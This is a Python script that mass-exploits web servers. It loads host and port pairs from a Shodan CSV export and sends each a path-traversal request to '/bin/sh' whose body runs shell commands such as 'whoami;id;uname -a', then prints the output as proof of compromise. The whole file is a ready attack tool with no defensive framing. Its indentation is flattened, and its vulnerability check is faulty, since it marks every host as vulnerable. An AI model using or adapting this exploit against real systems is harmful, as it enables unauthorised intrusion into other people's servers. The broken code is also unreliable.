import csv

import requests

   

def read_hosts_from_csv():

  """

  reads the shodan cvs dump and extract host and ports

  @:parameter none

  :return: host lists

  """

  path = '/shodan-export.csv'

  host_lists = []

  with open(path, newline='') as csvfile:

  records = csv.reader(csvfile)

  for record in records:

  host_lists.append(record[0] + ":" + record[1])

  return host_lists

  

  

 if __name__ == '__main__':

  # proxy = {"http": "http://127.0.0.1:8080"}

  exp = "/.%0d./.%0d./.%0d./.%0d./bin/sh"

  for host in read_hosts_from_csv():

  host, port = host.split(':')

  # Lazy Me

  if "IP" not in host:

  

  # Debugging request

  # req = requests.post('http://' + host + ":" + port+exp,

  # data='ifconfig 2>&1; echo "~~~~~~~~~"; id; echo "##########";', timeout=3,

  # proxies=proxy)

  try:

  

  cmd = "whoami;id;uname -a"

  print("[~] Trying ... " + host, port)

  req2 = requests.post('http://' + host + ":" + port + exp,

  data='ifconfig 2>&1; echo "~~~~~~~~~~"; ' + cmd + ' ; echo "##########";',

  timeout=10) # change the timeout if needed

  

  # print (req2.status_code)

  # print (req2.text)

  firstIndex = str(req2.text).find('~~~~~~~~~~')

  secondIndex = str(req2.text).find('##########')

  

  if firstIndex:

  print("#################### Vulnerable #######################")

  print("[+] Now exploiting "+host)

  print(str(req2.text)[firstIndex + 10:secondIndex])

  

  # Host Detection

  # time.sleep(10)

  # req3 = requests.get(

  # 'https://www.who-hosts-this.com/APIEndpoint/Detect?key'

  # '=YOUR_API_KEY&url=' + host)

  # isp = json.loads(req3.text)

  # print("Hosted by:" + isp['results'][0]['isp_name'])

  

  print("#################### End #######################")

  except:

  # print('Err' + host)

  pass
